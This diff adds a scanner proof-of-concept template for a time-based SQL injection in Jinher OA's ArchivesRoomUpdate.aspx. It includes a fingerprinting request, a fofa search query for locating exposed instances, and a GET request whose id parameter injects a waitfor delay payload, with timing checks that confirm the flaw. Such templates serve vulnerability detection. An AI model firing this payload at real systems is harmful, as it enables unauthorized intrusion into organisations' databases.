@@ -1,0 +1,31 @@
+id: poc-yaml-jinher-archivesroomupdate-aspx-sqli
+info:
+  name: 金和OA ArchivesRoomUpdate.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(2,5)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /C6/Jhsoft.Web.login/PassWordSlideFull.aspx
+  expression: contains(body,"JHSoft")
+- method: GET
+  path: /c6/Jhsoft.Web.Archives/ArchivesRoomUpdate.aspx/?id=1'waitfor+delay'0:0:{{.t1}}'--
+  expression: 'status_code == 200 &&
+
+    contains(gbk_decode(body),"修改档案室") &&
+
+    contains(gbk_decode(body),"管理员") &&
+
+    contains(gbk_decode(body),"档案室不能为空") &&
+
+    duration >= t1 &&
+
+    duration <= t2
+
+    '
+transport: http
